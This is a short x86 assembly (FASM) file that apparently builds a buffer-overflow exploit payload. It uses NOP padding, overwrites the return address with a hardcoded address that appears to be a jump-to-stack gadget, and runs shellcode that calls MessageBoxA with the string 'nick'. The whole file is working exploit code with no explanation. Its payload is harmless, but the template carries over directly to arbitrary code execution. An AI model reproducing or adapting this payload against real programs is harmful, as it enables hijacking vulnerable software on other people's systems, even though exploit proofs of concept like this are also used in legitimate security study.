;format PE
use32
include 'bare.inc'

db 0x34 dup(0x90)
dd 0x7e429353
start:
xor ebx, ebx
push dword 0x6b63696e
mov eax, esp
push ebx
push eax
push eax
push ebx
mov eax, 0x7e4507ea ;[MessageBoxA]
;mov eax, 0x7c85ad4c ;OutputDebugStringA
call eax
;db (0x34 - $) dup(0x90)
;dd 0x12fb2c
db 0